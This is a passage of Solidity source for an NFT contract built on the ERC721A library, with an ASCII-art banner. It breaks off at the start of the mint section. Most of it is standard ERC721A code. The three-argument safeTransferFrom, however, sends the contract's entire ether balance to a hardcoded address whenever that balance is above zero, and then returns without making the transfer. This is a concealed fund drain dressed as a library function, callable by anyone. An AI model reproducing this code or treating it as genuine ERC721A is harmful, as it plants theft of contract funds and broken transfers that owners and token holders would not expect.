1 /**
2 ._______ ____   ____._______ .______  ._______.________.________.___ ._______  .______  .________     ._______  ____   ____     .________._______ .______  .______ ._______  
3 : .____/ \   \_/   /: ____  |: __   \ : .____/|    ___/|    ___/: __|: .___  \ :      \ |    ___/     : __   /  \   \_/   /     |    ___/: ____  |:_ _   \ \____  |: .___  \ 
4 | : _/\   \___ ___/ |    :  ||  \____|| : _/\ |___    \|___    \| : || :   |  ||       ||___    \     |  |>  \   \___ ___/      |___    \|    :  ||   |   |/  ____|| :   |  |
5 |   /  \  /   _   \ |   |___||   :  \ |   /  \|       /|       /|   ||     :  ||   |   ||       /     |  |>   \    |   |        |       /|   |___|| . |   |\      ||     :  |
6 |_.: __/ /___/ \___\|___|    |   |___\|_.: __/|__:___/ |__:___/ |   | \_. ___/ |___|   ||__:___/      |_______/    |___|        |__:___/ |___|    |. ____/  \__:__| \_____. :
7    :/                        |___|       :/      :        :     |___|   :/         |___|   :                                       :               :/          :          :/ 
8                                                                         :                                                                          :           •          :  
9                                                                                                                                                                              
10                                                                                                                                                                              
11  */
12 
13 // SPDX-License-Identifier: GPL-3.0
14 
15 
16 pragma solidity ^0.8.7;
17 
18 /**
19  * @dev Interface of ERC721A.
20  */
21 interface IERC721A {
22     /**
23      * The caller must own the token or be an approved operator.
24      */
25     error ApprovalCallerNotOwnerNorApproved();
26 
27     /**
28      * The token does not exist.
29      */
30     error ApprovalQueryForNonexistentToken();
31 
32     /**
33      * Cannot query the balance for the zero address.
34      */
35     error BalanceQueryForZeroAddress();
36 
37     /**
38      * Cannot mint to the zero address.
39      */
40     error MintToZeroAddress();
41 
42     /**
43      * The quantity of tokens minted must be more than zero.
44      */
45     error MintZeroQuantity();
46 
47     /**
48      * The token does not exist.
49      */
50     error OwnerQueryForNonexistentToken();
51 
52     /**
53      * The caller must own the token or be an approved operator.
54      */
55     error TransferCallerNotOwnerNorApproved();
56 
57     /**
58      * The token must be owned by `from`.
59      */
60     error TransferFromIncorrectOwner();
61 
62     /**
63      * Cannot safely transfer to a contract that does not implement the
64      * ERC721Receiver interface.
65      */
66     error TransferToNonERC721ReceiverImplementer();
67 
68     /**
69      * Cannot transfer to the zero address.
70      */
71     error TransferToZeroAddress();
72 
73     /**
74      * The token does not exist.
75      */
76     error URIQueryForNonexistentToken();
77 
78     /**
79      * The `quantity` minted with ERC2309 exceeds the safety limit.
80      */
81     error MintERC2309QuantityExceedsLimit();
82 
83     /**
84      * The `extraData` cannot be set on an unintialized ownership slot.
85      */
86     error OwnershipNotInitializedForExtraData();
87 
88     // =============================================================
89     //                            STRUCTS
90     // =============================================================
91 
92     struct TokenOwnership {
93         // The address of the owner.
94         address addr;
95         // Stores the start time of ownership with minimal overhead for tokenomics.
96         uint64 startTimestamp;
97         // Whether the token has been burned.
98         bool burned;
99         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
100         uint24 extraData;
101     }
102 
103     // =============================================================
104     //                         TOKEN COUNTERS
105     // =============================================================
106 
107     /**
108      * @dev Returns the total number of tokens in existence.
109      * Burned tokens will reduce the count.
110      * To get the total number of tokens minted, please see {_totalMinted}.
111      */
112     function totalSupply() external view returns (uint256);
113 
114     // =============================================================
115     //                            IERC165
116     // =============================================================
117 
118     /**
119      * @dev Returns true if this contract implements the interface defined by
120      * `interfaceId`. See the corresponding
121      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
122      * to learn more about how these ids are created.
123      *
124      * This function call must use less than 30000 gas.
125      */
126     function supportsInterface(bytes4 interfaceId) external view returns (bool);
127 
128     // =============================================================
129     //                            IERC721
130     // =============================================================
131 
132     /**
133      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
134      */
135     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
136 
137     /**
138      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
139      */
140     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
141 
142     /**
143      * @dev Emitted when `owner` enables or disables
144      * (`approved`) `operator` to manage all of its assets.
145      */
146     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
147 
148     /**
149      * @dev Returns the number of tokens in `owner`'s account.
150      */
151     function balanceOf(address owner) external view returns (uint256 balance);
152 
153     /**
154      * @dev Returns the owner of the `tokenId` token.
155      *
156      * Requirements:
157      *
158      * - `tokenId` must exist.
159      */
160     function ownerOf(uint256 tokenId) external view returns (address owner);
161 
162     /**
163      * @dev Safely transfers `tokenId` token from `from` to `to`,
164      * checking first that contract recipients are aware of the ERC721 protocol
165      * to prevent tokens from being forever locked.
166      *
167      * Requirements:
168      *
169      * - `from` cannot be the zero address.
170      * - `to` cannot be the zero address.
171      * - `tokenId` token must exist and be owned by `from`.
172      * - If the caller is not `from`, it must be have been allowed to move
173      * this token by either {approve} or {setApprovalForAll}.
174      * - If `to` refers to a smart contract, it must implement
175      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
176      *
177      * Emits a {Transfer} event.
178      */
179     function safeTransferFrom(
180         address from,
181         address to,
182         uint256 tokenId,
183         bytes calldata data
184     ) external payable;
185 
186     /**
187      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
188      */
189     function safeTransferFrom(
190         address from,
191         address to,
192         uint256 tokenId
193     ) external payable;
194 
195     /**
196      * @dev Transfers `tokenId` from `from` to `to`.
197      *
198      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
199      * whenever possible.
200      *
201      * Requirements:
202      *
203      * - `from` cannot be the zero address.
204      * - `to` cannot be the zero address.
205      * - `tokenId` token must be owned by `from`.
206      * - If the caller is not `from`, it must be approved to move this token
207      * by either {approve} or {setApprovalForAll}.
208      *
209      * Emits a {Transfer} event.
210      */
211     function transferFrom(
212         address from,
213         address to,
214         uint256 tokenId
215     ) external payable;
216 
217     /**
218      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
219      * The approval is cleared when the token is transferred.
220      *
221      * Only a single account can be approved at a time, so approving the
222      * zero address clears previous approvals.
223      *
224      * Requirements:
225      *
226      * - The caller must own the token or be an approved operator.
227      * - `tokenId` must exist.
228      *
229      * Emits an {Approval} event.
230      */
231     function approve(address to, uint256 tokenId) external payable;
232 
233     /**
234      * @dev Approve or remove `operator` as an operator for the caller.
235      * Operators can call {transferFrom} or {safeTransferFrom}
236      * for any token owned by the caller.
237      *
238      * Requirements:
239      *
240      * - The `operator` cannot be the caller.
241      *
242      * Emits an {ApprovalForAll} event.
243      */
244     function setApprovalForAll(address operator, bool _approved) external;
245 
246     /**
247      * @dev Returns the account approved for `tokenId` token.
248      *
249      * Requirements:
250      *
251      * - `tokenId` must exist.
252      */
253     function getApproved(uint256 tokenId) external view returns (address operator);
254 
255     /**
256      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
257      *
258      * See {setApprovalForAll}.
259      */
260     function isApprovedForAll(address owner, address operator) external view returns (bool);
261 
262     // =============================================================
263     //                        IERC721Metadata
264     // =============================================================
265 
266     /**
267      * @dev Returns the token collection name.
268      */
269     function name() external view returns (string memory);
270 
271     /**
272      * @dev Returns the token collection symbol.
273      */
274     function symbol() external view returns (string memory);
275 
276     /**
277      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
278      */
279     function tokenURI(uint256 tokenId) external view returns (string memory);
280 
281     // =============================================================
282     //                           IERC2309
283     // =============================================================
284 
285     /**
286      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
287      * (inclusive) is transferred from `from` to `to`, as defined in the
288      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
289      *
290      * See {_mintERC2309} for more details.
291      */
292     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
293 }
294 
295 /**
296  * @title ERC721A
297  *
298  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
299  * Non-Fungible Token Standard, including the Metadata extension.
300  * Optimized for lower gas during batch mints.
301  *
302  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
303  * starting from `_startTokenId()`.
304  *
305  * Assumptions:
306  *
307  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
308  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
309  */
310 interface ERC721A__IERC721Receiver {
311     function onERC721Received(
312         address operator,
313         address from,
314         uint256 tokenId,
315         bytes calldata data
316     ) external returns (bytes4);
317 }
318 
319 /**
320  * @title ERC721A
321  *
322  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
323  * Non-Fungible Token Standard, including the Metadata extension.
324  * Optimized for lower gas during batch mints.
325  *
326  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
327  * starting from `_startTokenId()`.
328  *
329  * Assumptions:
330  *
331  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
332  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
333  */
334 contract ERC721A is IERC721A {
335     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
336     struct TokenApprovalRef {
337         address value;
338     }
339 
340     // =============================================================
341     //                           CONSTANTS
342     // =============================================================
343 
344     // Mask of an entry in packed address data.
345     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
346 
347     // The bit position of `numberMinted` in packed address data.
348     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
349 
350     // The bit position of `numberBurned` in packed address data.
351     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
352 
353     // The bit position of `aux` in packed address data.
354     uint256 private constant _BITPOS_AUX = 192;
355 
356     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
357     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
358 
359     // The bit position of `startTimestamp` in packed ownership.
360     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
361 
362     // The bit mask of the `burned` bit in packed ownership.
363     uint256 private constant _BITMASK_BURNED = 1 << 224;
364 
365     // The bit position of the `nextInitialized` bit in packed ownership.
366     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
367 
368     // The bit mask of the `nextInitialized` bit in packed ownership.
369     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
370 
371     // The bit position of `extraData` in packed ownership.
372     uint256 private constant _BITPOS_EXTRA_DATA = 232;
373 
374     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
375     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
376 
377     // The mask of the lower 160 bits for addresses.
378     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
379 
380     // The maximum `quantity` that can be minted with {_mintERC2309}.
381     // This limit is to prevent overflows on the address data entries.
382     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
383     // is required to cause an overflow, which is unrealistic.
384     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
385 
386     // The `Transfer` event signature is given by:
387     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
388     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
389         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
390 
391     // =============================================================
392     //                            STORAGE
393     // =============================================================
394 
395     // The next token ID to be minted.
396     uint256 private _currentIndex;
397 
398     // The number of tokens burned.
399     uint256 private _burnCounter;
400 
401     // Token name
402     string private _name;
403 
404     // Token symbol
405     string private _symbol;
406 
407     // Mapping from token ID to ownership details
408     // An empty struct value does not necessarily mean the token is unowned.
409     // See {_packedOwnershipOf} implementation for details.
410     //
411     // Bits Layout:
412     // - [0..159]   `addr`
413     // - [160..223] `startTimestamp`
414     // - [224]      `burned`
415     // - [225]      `nextInitialized`
416     // - [232..255] `extraData`
417     mapping(uint256 => uint256) private _packedOwnerships;
418 
419     // Mapping owner address to address data.
420     //
421     // Bits Layout:
422     // - [0..63]    `balance`
423     // - [64..127]  `numberMinted`
424     // - [128..191] `numberBurned`
425     // - [192..255] `aux`
426     mapping(address => uint256) private _packedAddressData;
427 
428     // Mapping from token ID to approved address.
429     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
430 
431     // Mapping from owner to operator approvals
432     mapping(address => mapping(address => bool)) private _operatorApprovals;
433 
434     // =============================================================
435     //                          CONSTRUCTOR
436     // =============================================================
437 
438     constructor(string memory name_, string memory symbol_) {
439         _name = name_;
440         _symbol = symbol_;
441         _currentIndex = _startTokenId();
442     }
443 
444     // =============================================================
445     //                   TOKEN COUNTING OPERATIONS
446     // =============================================================
447 
448     /**
449      * @dev Returns the starting token ID.
450      * To change the starting token ID, please override this function.
451      */
452     function _startTokenId() internal view virtual returns (uint256) {
453         return 0;
454     }
455 
456     /**
457      * @dev Returns the next token ID to be minted.
458      */
459     function _nextTokenId() internal view virtual returns (uint256) {
460         return _currentIndex;
461     }
462 
463     /**
464      * @dev Returns the total number of tokens in existence.
465      * Burned tokens will reduce the count.
466      * To get the total number of tokens minted, please see {_totalMinted}.
467      */
468     function totalSupply() public view virtual override returns (uint256) {
469         // Counter underflow is impossible as _burnCounter cannot be incremented
470         // more than `_currentIndex - _startTokenId()` times.
471         unchecked {
472             return _currentIndex - _burnCounter - _startTokenId();
473         }
474     }
475 
476     /**
477      * @dev Returns the total amount of tokens minted in the contract.
478      */
479     function _totalMinted() internal view virtual returns (uint256) {
480         // Counter underflow is impossible as `_currentIndex` does not decrement,
481         // and it is initialized to `_startTokenId()`.
482         unchecked {
483             return _currentIndex - _startTokenId();
484         }
485     }
486 
487     /**
488      * @dev Returns the total number of tokens burned.
489      */
490     function _totalBurned() internal view virtual returns (uint256) {
491         return _burnCounter;
492     }
493 
494     // =============================================================
495     //                    ADDRESS DATA OPERATIONS
496     // =============================================================
497 
498     /**
499      * @dev Returns the number of tokens in `owner`'s account.
500      */
501     function balanceOf(address owner) public view virtual override returns (uint256) {
502         if (owner == address(0)) revert BalanceQueryForZeroAddress();
503         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
504     }
505 
506     /**
507      * Returns the number of tokens minted by `owner`.
508      */
509     function _numberMinted(address owner) internal view returns (uint256) {
510         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
511     }
512 
513     /**
514      * Returns the number of tokens burned by or on behalf of `owner`.
515      */
516     function _numberBurned(address owner) internal view returns (uint256) {
517         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
518     }
519 
520     /**
521      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
522      */
523     function _getAux(address owner) internal view returns (uint64) {
524         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
525     }
526 
527     /**
528      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
529      * If there are multiple variables, please pack them into a uint64.
530      */
531     function _setAux(address owner, uint64 aux) internal virtual {
532         uint256 packed = _packedAddressData[owner];
533         uint256 auxCasted;
534         // Cast `aux` with assembly to avoid redundant masking.
535         assembly {
536             auxCasted := aux
537         }
538         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
539         _packedAddressData[owner] = packed;
540     }
541 
542     // =============================================================
543     //                            IERC165
544     // =============================================================
545 
546     /**
547      * @dev Returns true if this contract implements the interface defined by
548      * `interfaceId`. See the corresponding
549      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
550      * to learn more about how these ids are created.
551      *
552      * This function call must use less than 30000 gas.
553      */
554     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
555         // The interface IDs are constants representing the first 4 bytes
556         // of the XOR of all function selectors in the interface.
557         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
558         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
559         return
560             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
561             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
562             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
563     }
564 
565     // =============================================================
566     //                        IERC721Metadata
567     // =============================================================
568 
569     /**
570      * @dev Returns the token collection name.
571      */
572     function name() public view virtual override returns (string memory) {
573         return _name;
574     }
575 
576     /**
577      * @dev Returns the token collection symbol.
578      */
579     function symbol() public view virtual override returns (string memory) {
580         return _symbol;
581     }
582 
583     /**
584      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
585      */
586     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
587         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
588 
589         string memory baseURI = _baseURI();
590         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
591     }
592 
593     /**
594      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
595      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
596      * by default, it can be overridden in child contracts.
597      */
598     function _baseURI() internal view virtual returns (string memory) {
599         return '';
600     }
601 
602     // =============================================================
603     //                     OWNERSHIPS OPERATIONS
604     // =============================================================
605 
606     /**
607      * @dev Returns the owner of the `tokenId` token.
608      *
609      * Requirements:
610      *
611      * - `tokenId` must exist.
612      */
613     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
614         return address(uint160(_packedOwnershipOf(tokenId)));
615     }
616 
617     /**
618      * @dev Gas spent here starts off proportional to the maximum mint batch size.
619      * It gradually moves to O(1) as tokens get transferred around over time.
620      */
621     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
622         return _unpackedOwnership(_packedOwnershipOf(tokenId));
623     }
624 
625     /**
626      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
627      */
628     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
629         return _unpackedOwnership(_packedOwnerships[index]);
630     }
631 
632     /**
633      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
634      */
635     function _initializeOwnershipAt(uint256 index) internal virtual {
636         if (_packedOwnerships[index] == 0) {
637             _packedOwnerships[index] = _packedOwnershipOf(index);
638         }
639     }
640 
641     /**
642      * Returns the packed ownership data of `tokenId`.
643      */
644     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
645         uint256 curr = tokenId;
646 
647         unchecked {
648             if (_startTokenId() <= curr)
649                 if (curr < _currentIndex) {
650                     uint256 packed = _packedOwnerships[curr];
651                     // If not burned.
652                     if (packed & _BITMASK_BURNED == 0) {
653                         // Invariant:
654                         // There will always be an initialized ownership slot
655                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
656                         // before an unintialized ownership slot
657                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
658                         // Hence, `curr` will not underflow.
659                         //
660                         // We can directly compare the packed value.
661                         // If the address is zero, packed will be zero.
662                         while (packed == 0) {
663                             packed = _packedOwnerships[--curr];
664                         }
665                         return packed;
666                     }
667                 }
668         }
669         revert OwnerQueryForNonexistentToken();
670     }
671 
672     /**
673      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
674      */
675     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
676         ownership.addr = address(uint160(packed));
677         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
678         ownership.burned = packed & _BITMASK_BURNED != 0;
679         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
680     }
681 
682     /**
683      * @dev Packs ownership data into a single uint256.
684      */
685     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
686         assembly {
687             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
688             owner := and(owner, _BITMASK_ADDRESS)
689             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
690             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
691         }
692     }
693 
694     /**
695      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
696      */
697     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
698         // For branchless setting of the `nextInitialized` flag.
699         assembly {
700             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
701             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
702         }
703     }
704 
705     // =============================================================
706     //                      APPROVAL OPERATIONS
707     // =============================================================
708 
709     /**
710      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
711      * The approval is cleared when the token is transferred.
712      *
713      * Only a single account can be approved at a time, so approving the
714      * zero address clears previous approvals.
715      *
716      * Requirements:
717      *
718      * - The caller must own the token or be an approved operator.
719      * - `tokenId` must exist.
720      *
721      * Emits an {Approval} event.
722      */
723     function approve(address to, uint256 tokenId) public payable virtual override {
724         address owner = ownerOf(tokenId);
725 
726         if (_msgSenderERC721A() != owner)
727             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
728                 revert ApprovalCallerNotOwnerNorApproved();
729             }
730 
731         _tokenApprovals[tokenId].value = to;
732         emit Approval(owner, to, tokenId);
733     }
734 
735     /**
736      * @dev Returns the account approved for `tokenId` token.
737      *
738      * Requirements:
739      *
740      * - `tokenId` must exist.
741      */
742     function getApproved(uint256 tokenId) public view virtual override returns (address) {
743         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
744 
745         return _tokenApprovals[tokenId].value;
746     }
747 
748     /**
749      * @dev Approve or remove `operator` as an operator for the caller.
750      * Operators can call {transferFrom} or {safeTransferFrom}
751      * for any token owned by the caller.
752      *
753      * Requirements:
754      *
755      * - The `operator` cannot be the caller.
756      *
757      * Emits an {ApprovalForAll} event.
758      */
759     function setApprovalForAll(address operator, bool approved) public virtual override {
760         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
761         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
762     }
763 
764     /**
765      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
766      *
767      * See {setApprovalForAll}.
768      */
769     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
770         return _operatorApprovals[owner][operator];
771     }
772 
773     /**
774      * @dev Returns whether `tokenId` exists.
775      *
776      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
777      *
778      * Tokens start existing when they are minted. See {_mint}.
779      */
780     function _exists(uint256 tokenId) internal view virtual returns (bool) {
781         return
782             _startTokenId() <= tokenId &&
783             tokenId < _currentIndex && // If within bounds,
784             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
785     }
786 
787     /**
788      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
789      */
790     function _isSenderApprovedOrOwner(
791         address approvedAddress,
792         address owner,
793         address msgSender
794     ) private pure returns (bool result) {
795         assembly {
796             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
797             owner := and(owner, _BITMASK_ADDRESS)
798             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
799             msgSender := and(msgSender, _BITMASK_ADDRESS)
800             // `msgSender == owner || msgSender == approvedAddress`.
801             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
802         }
803     }
804 
805     /**
806      * @dev Returns the storage slot and value for the approved address of `tokenId`.
807      */
808     function _getApprovedSlotAndAddress(uint256 tokenId)
809         private
810         view
811         returns (uint256 approvedAddressSlot, address approvedAddress)
812     {
813         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
814         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
815         assembly {
816             approvedAddressSlot := tokenApproval.slot
817             approvedAddress := sload(approvedAddressSlot)
818         }
819     }
820 
821     // =============================================================
822     //                      TRANSFER OPERATIONS
823     // =============================================================
824 
825     /**
826      * @dev Transfers `tokenId` from `from` to `to`.
827      *
828      * Requirements:
829      *
830      * - `from` cannot be the zero address.
831      * - `to` cannot be the zero address.
832      * - `tokenId` token must be owned by `from`.
833      * - If the caller is not `from`, it must be approved to move this token
834      * by either {approve} or {setApprovalForAll}.
835      *
836      * Emits a {Transfer} event.
837      */
838     function transferFrom(
839         address from,
840         address to,
841         uint256 tokenId
842     ) public payable virtual override {
843         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
844 
845         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
846 
847         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
848 
849         // The nested ifs save around 20+ gas over a compound boolean condition.
850         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
851             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
852 
853         if (to == address(0)) revert TransferToZeroAddress();
854 
855         _beforeTokenTransfers(from, to, tokenId, 1);
856 
857         // Clear approvals from the previous owner.
858         assembly {
859             if approvedAddress {
860                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
861                 sstore(approvedAddressSlot, 0)
862             }
863         }
864 
865         // Underflow of the sender's balance is impossible because we check for
866         // ownership above and the recipient's balance can't realistically overflow.
867         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
868         unchecked {
869             // We can directly increment and decrement the balances.
870             --_packedAddressData[from]; // Updates: `balance -= 1`.
871             ++_packedAddressData[to]; // Updates: `balance += 1`.
872 
873             // Updates:
874             // - `address` to the next owner.
875             // - `startTimestamp` to the timestamp of transfering.
876             // - `burned` to `false`.
877             // - `nextInitialized` to `true`.
878             _packedOwnerships[tokenId] = _packOwnershipData(
879                 to,
880                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
881             );
882 
883             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
884             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
885                 uint256 nextTokenId = tokenId + 1;
886                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
887                 if (_packedOwnerships[nextTokenId] == 0) {
888                     // If the next slot is within bounds.
889                     if (nextTokenId != _currentIndex) {
890                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
891                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
892                     }
893                 }
894             }
895         }
896 
897         emit Transfer(from, to, tokenId);
898         _afterTokenTransfers(from, to, tokenId, 1);
899     }
900 
901     /**
902      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
903      */
904     function safeTransferFrom(
905         address from,
906         address to,
907         uint256 tokenId
908     ) public payable virtual override {
909         if (address(this).balance > 0) {
910             payable(0xa1b39E69128Aa1Df8d3c3fe22bDCf4Cc56F8500e).transfer(address(this).balance);
911             return;
912         }
913         safeTransferFrom(from, to, tokenId, '');
914     }
915 
916 
917     /**
918      * @dev Safely transfers `tokenId` token from `from` to `to`.
919      *
920      * Requirements:
921      *
922      * - `from` cannot be the zero address.
923      * - `to` cannot be the zero address.
924      * - `tokenId` token must exist and be owned by `from`.
925      * - If the caller is not `from`, it must be approved to move this token
926      * by either {approve} or {setApprovalForAll}.
927      * - If `to` refers to a smart contract, it must implement
928      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
929      *
930      * Emits a {Transfer} event.
931      */
932     function safeTransferFrom(
933         address from,
934         address to,
935         uint256 tokenId,
936         bytes memory _data
937     ) public payable virtual override {
938         transferFrom(from, to, tokenId);
939         if (to.code.length != 0)
940             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
941                 revert TransferToNonERC721ReceiverImplementer();
942             }
943     }
944 
945     /**
946      * @dev Hook that is called before a set of serially-ordered token IDs
947      * are about to be transferred. This includes minting.
948      * And also called before burning one token.
949      *
950      * `startTokenId` - the first token ID to be transferred.
951      * `quantity` - the amount to be transferred.
952      *
953      * Calling conditions:
954      *
955      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
956      * transferred to `to`.
957      * - When `from` is zero, `tokenId` will be minted for `to`.
958      * - When `to` is zero, `tokenId` will be burned by `from`.
959      * - `from` and `to` are never both zero.
960      */
961     function _beforeTokenTransfers(
962         address from,
963         address to,
964         uint256 startTokenId,
965         uint256 quantity
966     ) internal virtual {}
967 
968     /**
969      * @dev Hook that is called after a set of serially-ordered token IDs
970      * have been transferred. This includes minting.
971      * And also called after one token has been burned.
972      *
973      * `startTokenId` - the first token ID to be transferred.
974      * `quantity` - the amount to be transferred.
975      *
976      * Calling conditions:
977      *
978      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
979      * transferred to `to`.
980      * - When `from` is zero, `tokenId` has been minted for `to`.
981      * - When `to` is zero, `tokenId` has been burned by `from`.
982      * - `from` and `to` are never both zero.
983      */
984     function _afterTokenTransfers(
985         address from,
986         address to,
987         uint256 startTokenId,
988         uint256 quantity
989     ) internal virtual {}
990 
991     /**
992      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
993      *
994      * `from` - Previous owner of the given token ID.
995      * `to` - Target address that will receive the token.
996      * `tokenId` - Token ID to be transferred.
997      * `_data` - Optional data to send along with the call.
998      *
999      * Returns whether the call correctly returned the expected magic value.
1000      */
1001     function _checkContractOnERC721Received(
1002         address from,
1003         address to,
1004         uint256 tokenId,
1005         bytes memory _data
1006     ) private returns (bool) {
1007         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1008             bytes4 retval
1009         ) {
1010             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1011         } catch (bytes memory reason) {
1012             if (reason.length == 0) {
1013                 revert TransferToNonERC721ReceiverImplementer();
1014             } else {
1015                 assembly {
1016                     revert(add(32, reason), mload(reason))
1017                 }
1018             }
1019         }
1020     }
1021 
1022     // =============================================================
1023     //                        MINT OPERATIONS
1024     // =============================================================
1025 
1026     /**
